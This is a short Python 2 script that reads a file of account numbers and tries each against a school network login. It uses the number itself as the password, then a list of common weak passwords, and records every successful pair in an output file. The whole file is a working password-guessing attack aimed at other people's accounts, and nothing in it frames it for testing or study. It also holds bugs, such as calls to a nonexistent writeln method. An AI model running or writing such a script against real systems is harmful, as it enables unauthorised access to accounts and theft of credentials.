# -*- coding: UTF-8 -*-
import os
import HTMLParser
import urlparse
import urllib
import urllib2
import cookielib
import string
import re
from login_school_net import *
F = open('number','r')
Ans = open('Answer','w')

Password = ['123456','654321','888888','666666','111111']

def Get(Number):
	if login_school_net(Number,Number):
		Ans.writeln(Number+' '+Number)
	for i in Password:
		if login_school_net(Number,i):
			Ans.writeln(Number+' '+i)
			return



F = F.readlines()

for i in F:
	print i
	try:
		Get(i)
	except Exception:
		print Exception
